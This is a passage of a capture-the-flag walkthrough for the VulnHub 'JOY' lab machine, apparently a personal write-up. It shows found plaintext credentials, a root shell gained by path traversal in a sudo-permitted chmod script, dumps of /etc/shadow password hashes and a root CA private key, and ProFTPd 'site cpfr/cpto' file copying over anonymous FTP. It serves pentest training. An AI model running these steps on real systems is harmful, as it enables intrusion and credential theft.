-rw-r--r-- 1 www-data www-data   14 Dec 28  2018 .htaccess
-rwxr-xr-x 1 www-data www-data  240 Jul 19  2016 footer.html
-rwxr-xr-x 1 www-data www-data  791 Jul 19  2016 header.html
-rw-r--r-- 1 www-data www-data 2.1K Jul 19  2016 help.php
-rw-r--r-- 1 www-data www-data 5.3K Jul 19  2016 main.php
-rw-r--r-- 1 www-data www-data  15K Jul 19  2016 search.php
-rw-r--r-- 1 www-data www-data 9.1K Jul 19  2016 searchfw.php
-rw-r--r-- 1 www-data www-data  12K Jul 19  2016 stats.php
-rw-r--r-- 1 www-data www-data 4.7K Jul 19  2016 syscheck.php
-rw-r--r-- 1 www-data www-data 1.8K Jul 19  2016 user_mapping.php

./ossec/tmp:
total 28K
-rw-r--r-- 1 www-data www-data   14 Dec 28  2018 .htaccess
-rw-r--r-- 1 www-data www-data 8.7K Dec 21 19:11 output-tmp.1-2-771034c4e3028e7c31c7d449963ced1f.php
-rw-r--r-- 1 www-data www-data  12K Dec 21 19:12 output-tmp.1-4-155894e70e97b9a07e946d7bbda6d306.php
www-data@JOY:/var/www/tryingharderisjoy$ </code></pre>
<p>Found an interesting file.</p>
<figure>
<img src="24.interesting-file.png" alt="" /><figcaption>24.interesting-file</figcaption>
</figure>
<pre class="shell"><code>www-data@JOY:/var/www/tryingharderisjoy/ossec$ cat patricksecretsofjoy
cat patricksecretsofjoy
credentials for JOY:
patrick:apollo098765
root:howtheheckdoiknowwhattherootpasswordis

how would these hack3rs ever find such a page?

www-data@JOY:/var/www/tryingharderisjoy/ossec$ su patrick
su patrick
Password: apollo098765

patrick@JOY:/var/www/tryingharderisjoy/ossec$ whoami
whoami
patrick
patrick@JOY:/var/www/tryingharderisjoy/ossec$ id
id
uid=1000(patrick) gid=1000(patrick) groups=1000(patrick),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),113(bluetooth),114(lpadmin),118(scanner),1001(ftp)
patrick@JOY:/var/www/tryingharderisjoy/ossec$ sudo -l
sudo -l
Matching Defaults entries for patrick on JOY:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User patrick may run the following commands on JOY:
    (ALL) NOPASSWD: /home/patrick/script/test
patrick@JOY:/var/www/tryingharderisjoy/ossec$ cd</code></pre>
<figure>
<img src="25.escalated-to-user-patrick.png" alt="" /><figcaption>25.escalated-to-user-patrick</figcaption>
</figure>
<figure>
<img src="26.cannot-access-script-test.png" alt="" /><figcaption>26.cannot-access-script-test don’t have permissions</figcaption>
</figure>
<pre class="shell"><code>patrick@JOY:~$ sudo script/test
sudo script/test
I am practising how to do simple bash scripting!
What file would you like to change permissions within this directory?
test
test
What permissions would you like to set the file to?
777
777
Currently changing file permissions, please wait.
Tidying up...
Done!
patrick@JOY:~$ ls -la script/test
ls -la script/test
ls: cannot access &#39;script/test&#39;: Permission denied
</code></pre>
<h2 id="getting-root-shell">Getting root shell</h2>
<pre class="shell"><code>patrick@JOY:~$ sudo script/test
sudo script/test
I am practising how to do simple bash scripting!
What file would you like to change permissions within this directory?
/bin/bash
/bin/bash
What permissions would you like to set the file to?
4777
4777
Currently changing file permissions, please wait.
chmod: cannot access &#39;/home/patrick/script//bin/bash&#39;: No such file or directory
Tidying up...
Done!
patrick@JOY:~$ pwd
pwd
/home/patrick
patrick@JOY:~$ sudo script/test
sudo script/test
I am practising how to do simple bash scripting!
What file would you like to change permissions within this directory?
../../../bin/bash
../../../bin/bash
What permissions would you like to set the file to?
4777
4777
Currently changing file permissions, please wait.
Tidying up...
Done!
patrick@JOY:~$ /bin/bash -pli
/bin/bash -pli
bash-4.4# hwoami
hwoami
bash: hwoami: command not found
bash-4.4# whoami
whoami
root
bash-4.4# id
id
uid=1000(patrick) gid=1000(patrick) euid=0(root) groups=1000(patrick),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),113(bluetooth),114(lpadmin),118(scanner),1001(ftp)
bash-4.4# hostname
hostname
JOY
bash-4.4# date
date
Tue Dec 21 19:54:17 +08 2021</code></pre>
<figure>
<img src="27.rooted.png" alt="" /><figcaption>27.rooted</figcaption>
</figure>
<h2 id="post-root">Post root</h2>
<h3 id="etcshadow">/etc/shadow</h3>
<pre class="shell"><code>cat /etc/shadow
root:$6$1xFSccJ0$o0y1Y1wScZ7FSYrsqhwPSYlm58gMeXNI1w336fcuD1qhaJzpKpEFX2BF6KI2Ue.8LGg0ELoPzfMcAjCDyt7pO1:17888:0:99999:7:::
daemon:*:17888:0:99999:7:::
bin:*:17888:0:99999:7:::
sys:*:17888:0:99999:7:::
sync:*:17888:0:99999:7:::
games:*:17888:0:99999:7:::
man:*:17888:0:99999:7:::
lp:*:17888:0:99999:7:::
mail:*:17888:0:99999:7:::
news:*:17888:0:99999:7:::
uucp:*:17888:0:99999:7:::
proxy:*:17888:0:99999:7:::
www-data:*:17888:0:99999:7:::
backup:*:17888:0:99999:7:::
list:*:17888:0:99999:7:::
irc:*:17888:0:99999:7:::
gnats:*:17888:0:99999:7:::
nobody:*:17888:0:99999:7:::
systemd-timesync:*:17888:0:99999:7:::
systemd-network:*:17888:0:99999:7:::
systemd-resolve:*:17888:0:99999:7:::
systemd-bus-proxy:*:17888:0:99999:7:::
_apt:*:17888:0:99999:7:::
rtkit:*:17888:0:99999:7:::
dnsmasq:*:17888:0:99999:7:::
messagebus:*:17888:0:99999:7:::
usbmux:*:17888:0:99999:7:::
geoclue:*:17888:0:99999:7:::
speech-dispatcher:!:17888:0:99999:7:::
pulse:*:17888:0:99999:7:::
avahi:*:17888:0:99999:7:::
colord:*:17888:0:99999:7:::
saned:*:17888:0:99999:7:::
hplip:*:17888:0:99999:7:::
Debian-gdm:*:17888:0:99999:7:::
patrick:$6$gp70WRqc$Lx5OEcBPnCh.ADYE7BUvxd0vzQGgDwI6AYMmtkHdJ..5NcbwYgb04DJUx2rmyc6mjxW0We5nDCveoEWnoKAB.0:17888:0:99999:7:::
ossec:*:17892:0:99999:7:::
ossecm:*:17892:0:99999:7:::
ossecr:*:17892:0:99999:7:::
mysql:!:17892:0:99999:7:::
ntp:*:17893:0:99999:7:::
Debian-snmp:!:17900:0:99999:7:::
ftp:$6$tbnbaqvF$gXhtn5Yw9zruUoNwqweryiNV7G/ix1kwvYZ.BPANhndyBXTa5/oMx9UW6XZ6mQMaviuaIfU0/r.abgjBGL2z90:17902:0:99999:7:::
tftp:*:17902:0:99999:7:::
postfix:*:17923:0:99999:7:::
dovecot:*:17923:0:99999:7:::
dovenull:*:17923:0:99999:7:::</code></pre>
<h3 id="etcpasswd">/etc/passwd</h3>
<pre class="shell"><code>cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
rtkit:x:105:110:RealtimeKit,,,:/proc:/bin/false
dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
geoclue:x:109:115::/var/lib/geoclue:/bin/false
speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
pulse:x:111:116:PulseAudio daemon,,,:/var/run/pulse:/bin/false
avahi:x:112:119:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
colord:x:113:120:colord colour management daemon,,,:/var/lib/colord:/bin/false
saned:x:114:121::/var/lib/saned:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
Debian-gdm:x:116:122:Gnome Display Manager:/var/lib/gdm3:/bin/false
patrick:x:1000:1000:patrick,,,:/home/patrick:/bin/bash
ossec:x:117:123::/var/ossec/:/bin/false
ossecm:x:118:123::/var/ossec/:/bin/false
ossecr:x:119:123::/var/ossec/:/bin/false
mysql:x:120:125:MySQL Server,,,:/nonexistent:/bin/false
ntp:x:121:126::/home/ntp:/bin/false
Debian-snmp:x:122:127::/var/lib/snmp:/bin/false
ftp:x:1001:1001::/home/ftp:/bin/false
tftp:x:123:128:tftp daemon,,,:/srv/tftp:/bin/false
postfix:x:124:129::/var/spool/postfix:/bin/false
dovecot:x:125:131:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
dovenull:x:126:132:Dovecot login user,,,:/nonexistent:/bin/false</code></pre>
<h3 id="etchosts">/etc/hosts</h3>
<pre class="shell"><code>cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       JOY

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters</code></pre>
<h3 id="files-in-etc"><code>*-</code> files in /etc</h3>
<pre class="shell"><code>ls -la /etc/*-
-rw------- 1 root root 1074 Jan 28  2019 /etc/group-
-rw------- 1 root root  893 Jan 28  2019 /etc/gshadow-
-rw------- 1 root root 2535 Jan 28  2019 /etc/passwd-
-rw------- 1 root root 1631 Jan 28  2019 /etc/shadow-
-rw------- 1 root root   21 Dec 23  2018 /etc/subgid-
-rw------- 1 root root   21 Dec 23  2018 /etc/subuid-
</code></pre>
<h4 id="etcshadow-">/etc/shadow-</h4>
<pre class="shell"><code>diff /etc/shadow /etc/shadow-
## nothing here...</code></pre>
<h4 id="etcpasswd-">/etc/passwd-</h4>
<pre class="shell"><code>bash-4.4# diff /etc/passwd /etc/passwd-
diff /etc/passwd /etc/passwd-
47c47
&lt; dovenull:x:126:132:Dovecot login user,,,:/nonexistent:/bin/false
---
&gt; dovenull:x:126:132::/nonexistent:/bin/false</code></pre>
<h3 id="cat-homepatrickscripttest">cat /home/patrick/script/test</h3>
<pre class="shell"><code>#!/bin/sh

echo &quot;I am practising how to do simple bash scripting!&quot;
sleep 3

echo &quot;What file would you like to change permissions within this directory?&quot;

read file
sleep 3

echo &quot;What permissions would you like to set the file to?&quot;

read permissions
sleep 3

echo &quot;Currently changing file permissions, please wait.&quot;
sleep 3

chmod $permissions /home/patrick/script/$file
echo &quot;Tidying up...&quot;
sleep 3

echo &quot;Done!&quot;</code></pre>
<h3 id="ls--la-root"><code>ls -la /root</code></h3>
<pre class="shell"><code>bash-4.4# ls -la
ls -la
total 104
drwx------  8 root root 4096 Jan 28  2019 .
drwxr-xr-x 23 root root 4096 Jan  6  2019 ..
----------  1 root root 1357 Jan 27  2019 author-secret.txt
-rw-------  1 root root 3086 Jan 28  2019 .bash_history
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwx------  3 root root 4096 Jan  5  2019 .cache
drwxr-xr-x  5 root root 4096 Jan  5  2019 .config
drwx------  3 root root 4096 Jan  5  2019 .dbus
-rw-r--r--  1 root root  435 Jan  7  2019 document-generator.sh
-rw-r--r--  1 root root 1322 Jan 28  2019 dovecot.crt
-rw-r--r--  1 root root 1062 Jan 28  2019 dovecot.csr
-rw-------  1 root root 1679 Jan 28  2019 dovecot.key
drwxr-xr-x  3 root root 4096 Jan  5  2019 .local
-rw-------  1 root root  231 Dec 28  2018 .msmtprc
-rw-------  1 root root   36 Dec 28  2018 .mysql_history
drwxr-xr-x  2 root root 4096 Dec 28  2018 .nano
-rw-r--r--  1 root root  540 Jan 10  2019 permissions.sh
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
----------  1 root root   71 Jan 10  2019 proof.txt
-rw-------  1 root root 1024 Jan 28  2019 .rnd
-rw-------  1 root root 1675 Jan 28  2019 rootCA.key
-rw-r--r--  1 root root 1444 Jan 28  2019 rootCA.pem
-rw-r--r--  1 root root   17 Jan 28  2019 rootCA.srl
-rw-r--r--  1 root root   66 Jan  6  2019 .selected_editor
drwx------  2 root root 4096 Jan  6  2019 .ssh
-rw-r--r--  1 root root  209 Dec 28  2018 .wget-hsts</code></pre>
<h3 id="flag-rootproof.txt">flag /root/proof.txt</h3>
<pre class="shell"><code>bash-4.4# cat proof.txt
cat proof.txt
Never grant sudo permissions on scripts that perform system functions!</code></pre>
<figure>
<img src="28.flag-root-proof-txt.png" alt="" /><figcaption>28.flag-root-proof-txt</figcaption>
</figure>
<h3 id="doc-rootauthor-secret.txt">doc /root/author-secret.txt</h3>
<pre class="shell"><code>bash-4.4# cat author-secret.txt
cat author-secret.txt
Thanks for joining us!

If you have not rooted MERCY, DEVELOPMENT, BRAVERY, TORMENT, please root them too!

This will conclude the series of five boxes on Vulnhub for pentesting practice, and once again, these were built while thinking about OffSec in mind. :-)

For those who have helped made videos on rooting these boxes, I am more than grateful for your support. This means a lot for the box creator and those who have helped test these boxes. A shoutout to the kind folk from Wizard Labs, Zajt, as well as friends in the local security community which I belong to.

If you found the boxes a good learning experience, feel free to share them with your friends.

As of the time of writing, I will be working on (building) some boxes on Wizard-Labs, in a similar flavour to these boxes. If you enjoyed these, consider pinging them and their project. I think their lab is slowly being built into a nice lab with a variety of machines with good learning value.

I was rather glad someone found me on Linkedin after breaking into these boxes. If you would like to contact the author, you can find some of the author&#39;s contact points on his website (https://donavan.sg).

May the r00t be with you.

P.S. Someone asked me, also, about &quot;shesmileslikeabrightsmiley&quot;. Yes, indeed, she smiles like a bright smiley. She makes me smile like a bright smiley too? :-)</code></pre>
<h3 id="script-rootpermissions.sh">script /root/permissions.sh</h3>
<pre class="shell"><code>bash-4.4# cat permissions.sh
cat permissions.sh
#!/bin/bash

# Conveniently, output the listing of /home/patrick in /home/ftp/upload.
echo &quot;Patrick&#39;s Directory&quot; &gt; /home/ftp/upload/directory
echo &quot;&quot; &gt;&gt; /home/ftp/upload/directory
ls -al /home/patrick &gt;&gt; /home/ftp/upload/directory
echo &quot;&quot; &gt;&gt; /home/ftp/upload/directory
echo &quot;You should know where the directory can be accessed.&quot; &gt;&gt; /home/ftp/upload/directory
echo &quot;&quot; &gt;&gt; /home/ftp/upload/directory
echo &quot;Information of this Machine!&quot; &gt;&gt; /home/ftp/upload/directory
echo &quot;&quot; &gt;&gt; /home/ftp/upload/directory
uname -a &gt;&gt; /home/ftp/upload/directory</code></pre>
<p>This tells me where the ftp directory is. I can go back and paste the file now.</p>
<h3 id="get-version_control-via-telnet-and-ftp">Get version_control via telnet and ftp</h3>
<pre class="shell"><code>
hostname -I: 192.168.42.7 192.168.56.70 
Tuesday 21 December 2021 02:53:30 PM IST 2021.12.21 14:53:30
f0c1s@kali:~/vuln-hubs/digitalworld.local/joy $
telnet $RHOST 21 
Trying 192.168.56.76...
Connected to 192.168.56.76.
Escape character is &#39;^]&#39;.
220 The Good Tech Inc. FTP Server
site cpfr /home/patrick/version_control
350 File or directory exists, ready for destination name
site cpto /home/ftp/upload/version_control
250 Copy successful
quit
221 Goodbye.
Connection closed by foreign host.
                                                                                                                   


hostname -I: 192.168.42.7 192.168.56.70 
Tuesday 21 December 2021 02:54:27 PM IST 2021.12.21 14:54:27
f0c1s@kali:~/vuln-hubs/digitalworld.local/joy $
ftp $RHOST 21
Connected to 192.168.56.76.
220 The Good Tech Inc. FTP Server
Name (192.168.56.76:f0c1s): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; cd upload
250 CWD command successful
ftp&gt; ls
229 Entering Extended Passive Mode (|||46488|)
150 Opening ASCII mode data connection for file list
-rwxrwxr-x   1 ftp      ftp         14381 Dec 21 14:54 directory
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_armadillo
-rw-rw-rw-   1 ftp      ftp            25 Jan  6  2019 project_bravado
-rw-rw-rw-   1 ftp      ftp            88 Jan  6  2019 project_desperado
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_emilio
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_flamingo
-rw-rw-rw-   1 ftp      ftp             7 Jan  6  2019 project_indigo
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_komodo
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_luyano
-rw-rw-rw-   1 ftp      ftp             8 Jan  6  2019 project_malindo
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_okacho
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_polento
-rw-rw-rw-   1 ftp      ftp            20 Jan  6  2019 project_ronaldinho
-rw-rw-rw-   1 ftp      ftp            55 Jan  6  2019 project_sicko
-rw-rw-rw-   1 ftp      ftp            57 Jan  6  2019 project_toto
-rw-rw-rw-   1 ftp      ftp             5 Jan  6  2019 project_uno
-rw-rw-rw-   1 ftp      ftp             9 Jan  6  2019 project_vivino
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_woranto
-rw-rw-rw-   1 ftp      ftp            20 Jan  6  2019 project_yolo
-rw-rw-rw-   1 ftp      ftp           180 Jan  6  2019 project_zoo
-rwxrwxr-x   1 ftp      ftp            24 Jan  6  2019 reminder
-rw-r--r--   1 0        0             407 Dec 21 14:54 version_control
226 Transfer complete
ftp&gt; get version_control
local: version_control remote: version_control
229 Entering Extended Passive Mode (|||54371|)
150 Opening BINARY mode data connection for version_control (407 bytes)
100% |**********************************************************************|   407        4.85 MiB/s    00:00 ETA
226 Transfer complete
407 bytes received in 00:00 (197.44 KiB/s)
ftp&gt; exit
221 Goodbye.
                                                                                                                   


hostname -I: 192.168.42.7 192.168.56.70 
Tuesday 21 December 2021 02:54:51 PM IST 2021.12.21 14:54:51
f0c1s@kali:~/vuln-hubs/digitalworld.local/joy $
cat version_control
Version Control of External-Facing Services:

Apache: 2.4.25
Dropbear SSH: 0.34
ProFTPd: 1.3.5
Samba: 4.5.12

We should switch to OpenSSH and upgrade ProFTPd.

Note that we have some other configurations in this machine.
1. The webroot is no longer /var/www/html. We have changed it to /var/www/tryingharderisjoy.
2. I am trying to perform some simple bash scripting tutorials. Let me see how it turns out.</code></pre>
<p><img src="29.telnet-copy-paste-version-control.png" alt="29.telnet-copy-paste-version-control" /> <img src="30.get-version-control-via-ftp.png" alt="30.get-version-control-via-ftp" /></p>
<p>But this doesn’t work with <code>nc</code>.</p>
<pre class="shell"><code>nc -nvC $RHOST 21
Connection to 192.168.56.76 21 port [tcp/*] succeeded!
220 The Good Tech Inc. FTP Server
user anonymous
331 Anonymous login ok, send your complete email address as your password
pass 
230 Anonymous access granted, restrictions apply
help 
214-The following commands are recognized (* =&gt;&#39;s unimplemented):
 CWD     XCWD    CDUP    XCUP    SMNT*   QUIT    PORT    PASV    
 EPRT    EPSV    ALLO*   RNFR    RNTO    DELE    MDTM    RMD     
 XRMD    MKD     XMKD    PWD     XPWD    SIZE    SYST    HELP    
 NOOP    FEAT    OPTS    AUTH*   CCC*    CONF*   ENC*    MIC*    
 PBSZ*   PROT*   TYPE    STRU    MODE    RETR    STOR    STOU    
 APPE    REST    ABOR    USER    PASS    ACCT*   REIN*   LIST    
 NLST    STAT    SITE    MLSD    MLST    
214 Direct comments to root@JOY
site cpfr /home/patrick/version_control
550 /home/patrick/version_control: No such file or directory
site cpto /home/ftp/version_control_nc
503 Bad sequence of commands
quit
221 Goodbye.</code></pre>
<h3 id="rootrootca.keypemsrl">/root/rootCA.{key,pem,srl}</h3>
<pre class="shell"><code>bash-4.4# cat rootCA.key
cat rootCA.key
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA0Yq+IjJ4lm0M7MfVGXKnlAN7c09u3tCOoeTRv/elfT3Uc+Ex
Rs9E+VJ/I1wP//5ocfas5bFod+UGxPA5xGBA881SQNLeEi3uXyNA+F14i1YPuplC
y3Pba5B2FNLGaupSMjAo8JCtgj3dYi6gUV/RFj+m+vMapuiLJCL1mz4eDtPx6u/h
PF9vMeiwmnE1Gfid3H5MUH6ngZBO3zJLXtGObshkS6KLwLm1I8FBaZr4J1WVFFhp
20wgW/wrHMj3fLvvzn3P+9Tk1CNadFGLjuvy8CARfKBjbEKC2J7ZwE9tDXGBB6lO
AKQ/0BEjlAVRwy1L6goN2u48fLNTdEtklor6TQIDAQABAoIBAEsSojwuSPXb7B2J
GtgbM97bwIb3lolNv0xRZrSYTTopxMwfikAMUnHhFJveh/z3cQQjlJ5WiU8rRtmY
F5o7wgmXLjj7U4S/3/9F6ikRk/aXxtrbvgqWX66R+zxKp7v2Z6yDhKdrrj5TW9Wp
TtbYtVh7RZ/zKUFTX0Z7H/OWtb4pmv9fEvh2bZiINiwqh/sOmtvmFKASPhYuL0P8
/WTsQWWMC8ChCWNWlqb24fjxljXNVkzIM4kRmGzR7KJYM75jEYyuXCjshl2WgpHV
nmhy2b2cc19j/SJt4Yi2axVzh6/GXJbMRJ1RTzxIKTvHvXJf1LVXrwPNPi05TSFO
UqbUWyECgYEA84rublOy4mMRPQK5HWiS6rFpBoRxbPYMJgy9ccqdacN5xw36OjXo
tBQ5c1uHr/O2fmJcltPbNyrAiK7cE91i6dxSOMfgs5yaLHgSkorWnAu4Q0PeCjp4
IYzrOVfwNi4Vyy3D8qit7xsShcTLDILN8eh5Js+GX5BCMEl2kSD2FucCgYEA3EKW
v9hCxP20UJGEwpbll33CqqWvkjMc0+4lot5/9V/jDcuEcqOs3z6oaokFbDtCJrih
BYR2kGqZpSyK3wPXf10FB2E3GaTF+PMsN5N26xRPi/o6JMpl8WdaGB937gFPMJrp
VPWChT3atSRvHUe6mNZuDY8nS9g2PG8AkaMJIqsCgYEA4qr35u83msShkqsqJ1jh
BFZCbbJu7v7Bp9hLqdDuWTV57e3waqUqBBCet+MEkpq9yzs4+ZgMe3fq4kv8wPBX
01kfnYFKfWDPjXvjrUhTHcE6qkBMNDDfBjrl4uUZyRNzbTsXGI4t9FC6GI5kfSxx
CSlZOOoFIoRdVhvJoqGO6RkCgYA3pv+OA6eDPJNF1C7WN+hU6aq5EVoWN6HuDnsl
9tAgAJVPFAAoMyDn214UZQCgwyxIule9HCYVAUpHCMUh6keV37v4jGCuswpuh4rB
lBn09dHPjW8JgrZVU4bZF4Jm+Z+3qTyRgeLzpZhQMp98p3YHTg7KkEQejsfNZ0Ke
ibIyNwKBgHF7r2FESlce3f9IekVO6cqzfL1gOpYtLQyldrjMmrbUThIbA5uIhET2
7TS/+hL3Z54+apvNOmrDdf/r8x3zWZqP2ML+D7WdMh4d1g3SYa+CMLljG0bpf/Zr
ngRsd/wuU4jiU4sAc3/5xlmtzjLz/gje7TfmWy3Qj1uf556fPNT9
-----END RSA PRIVATE KEY-----

bash-4.4# cat rootCA.pem
cat rootCA.pem
-----BEGIN CERTIFICATE-----
MIID/DCCAuSgAwIBAgIJAMASUEidPGQgMA0GCSqGSIb3DQEBCwUAMIGSMQswCQYD
VQQGEwJTRzESMBAGA1UECAwJU2luZ2Fwb3JlMRIwEAYDVQQHDAlTaW5nYXBvcmUx
GzAZBgNVBAoMEkdvb2QgVGVjaCBQdGUuIEx0ZDEMMAoGA1UECwwDSk9ZMQwwCgYD
VQQDDANKT1kxIjAgBgkqhkiG9w0BCQEWE2pveUBnb29kdGVjaC5jb20uc2cwHhcN
MTkwMTI3MTcyMDU5WhcNMjExMTE2MTcyMDU5WjCBkjELMAkGA1UEBhMCU0cxEjAQ
BgNVBAgMCVNpbmdhcG9yZTESMBAGA1UEBwwJU2luZ2Fwb3JlMRswGQYDVQQKDBJH
b29kIFRlY2ggUHRlLiBMdGQxDDAKBgNVBAsMA0pPWTEMMAoGA1UEAwwDSk9ZMSIw
IAYJKoZIhvcNAQkBFhNqb3lAZ29vZHRlY2guY29tLnNnMIIBIjANBgkqhkiG9w0B
AQEFAAOCAQ8AMIIBCgKCAQEA0Yq+IjJ4lm0M7MfVGXKnlAN7c09u3tCOoeTRv/el
fT3Uc+ExRs9E+VJ/I1wP//5ocfas5bFod+UGxPA5xGBA881SQNLeEi3uXyNA+F14
i1YPuplCy3Pba5B2FNLGaupSMjAo8JCtgj3dYi6gUV/RFj+m+vMapuiLJCL1mz4e
DtPx6u/hPF9vMeiwmnE1Gfid3H5MUH6ngZBO3zJLXtGObshkS6KLwLm1I8FBaZr4
J1WVFFhp20wgW/wrHMj3fLvvzn3P+9Tk1CNadFGLjuvy8CARfKBjbEKC2J7ZwE9t
DXGBB6lOAKQ/0BEjlAVRwy1L6goN2u48fLNTdEtklor6TQIDAQABo1MwUTAdBgNV
HQ4EFgQUAmiyIP4nBqnKW+cEEXm57MQN43kwHwYDVR0jBBgwFoAUAmiyIP4nBqnK
W+cEEXm57MQN43kwDwYDVR0TAQH/BAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEA
JTS5NaCwyFX2cSpnADeALjcbit6bCekIO/egoCHM82DuqIcMIF1NGH0W0EMow0Zd
1FiHOVja39PHeAPeslJHrELR0J7d0Ejwi3Q6uYc1iCvL6jt2cjMVcA4wA1CR731K
BC+zj8/lKplsJAxth1PK6Lq85eiWNvJx5/06oDj5xqoJaSryrPKkz/0yVwkxjJp7
mQFA7lh9MdsBlyTzh/X6r/BWDEWvLKytTfdj4Uz1weitrPMbY9ZvC6VTUl8jqbAs
lXvAZowe7AVHeAWj117bVki+OlP3tcjkCzAmHZSBDg7LKRfzpnzI/qJvLlQk9kDg
D4QLv2iupYG5dl8Qlpabxg==
-----END CERTIFICATE-----

bash-4.4# cat rootCA.srl
cat rootCA.srl
BBA232120B2BA6C7</code></pre>
<h3 id="rootdovecot.crtcsrkey">/root/dovecot.{crt,csr,key}</h3>
<pre class="shell"><code>bash-4.4# cat dovecot.crt
cat dovecot.crt
-----BEGIN CERTIFICATE-----
MIIDojCCAooCCQC7ojISCyumxzANBgkqhkiG9w0BAQsFADCBkjELMAkGA1UEBhMC
U0cxEjAQBgNVBAgMCVNpbmdhcG9yZTESMBAGA1UEBwwJU2luZ2Fwb3JlMRswGQYD
VQQKDBJHb29kIFRlY2ggUHRlLiBMdGQxDDAKBgNVBAsMA0pPWTEMMAoGA1UEAwwD
Sk9ZMSIwIAYJKoZIhvcNAQkBFhNqb3lAZ29vZHRlY2guY29tLnNnMB4XDTE5MDEy
NzE3MjMyM1oXDTMyMTAwNTE3MjMyM1owgZIxCzAJBgNVBAYTAlNHMRIwEAYDVQQI
DAlTaW5nYXBvcmUxEjAQBgNVBAcMCVNpbmdhcG9yZTEbMBkGA1UECgwSR29vZCBU
ZWNoIFB0ZS4gTHRkMQwwCgYDVQQLDANKT1kxDDAKBgNVBAMMA0pPWTEiMCAGCSqG
SIb3DQEJARYTam95QGdvb2R0ZWNoLmNvbS5zZzCCASIwDQYJKoZIhvcNAQEBBQAD
ggEPADCCAQoCggEBAMEcXK/3Zc9eUCY4cDXvNr/889t18fwSawRBdlHjTfADAnbI
3B9zux9T0ICw5RT2B/pNx229itUwI723YIPSsQKCWVeCSwamZuTdkHqSOIgqd64r
0VjiGp265B9ybChpZkMgftJjvnHaUNXhPnDOsIWwp0WKeoz6fd6hF817Loh2r8IK
x0brpFezr/lUZQiJqSMNeYRVZxzJ4jHJqq0OWfh4DVTJuQAQ6uyUV1Sgz1637izt
5pNdYZw9DBK4LjuP+s0iC6oz76MgSs+mtEFfc0D59KtyJEte4HWqhKsMGvHzmvQl
JchLaDsGkBQ0xaiCaWveA8AxW59wcXC1tUGXJAkCAwEAATANBgkqhkiG9w0BAQsF
AAOCAQEAb8TK96b4AHhyrrhiFZDkEgSzU6W0p8t5UQbYrwx/g7oRtT78N6wD4rsA
t+1qfaWCTL5KJ7kLrVnAnCdcZow90FrmIdsr3dib/4IKKNueiidXb0HD2/2FXCIw
+b0QABRlw1WZEX1DiJDIj8nuI0CtuL3mRmWcbw6P4EwvwoMlQTc9aQ1goASpmVTN
1uZLCs1Kz8XIXJueyU0lsYsXumqvdaBIkcOwiIFB3wAaK6+TB+9m91GpNFR41fiH
yHD2de8hnao+fiYSE416zQHTZgG7zDHpvH6OrO+TLLdEWtEvYo9xV9oirLcro+Wj
p6Rjq4nlJrAyLA9BXP/I2xDPquktJA==
-----END CERTIFICATE-----

bash-4.4# cat dovecot.csr
cat dovecot.csr
-----BEGIN CERTIFICATE REQUEST-----
MIIC2DCCAcACAQAwgZIxCzAJBgNVBAYTAlNHMRIwEAYDVQQIDAlTaW5nYXBvcmUx
EjAQBgNVBAcMCVNpbmdhcG9yZTEbMBkGA1UECgwSR29vZCBUZWNoIFB0ZS4gTHRk
MQwwCgYDVQQLDANKT1kxDDAKBgNVBAMMA0pPWTEiMCAGCSqGSIb3DQEJARYTam95
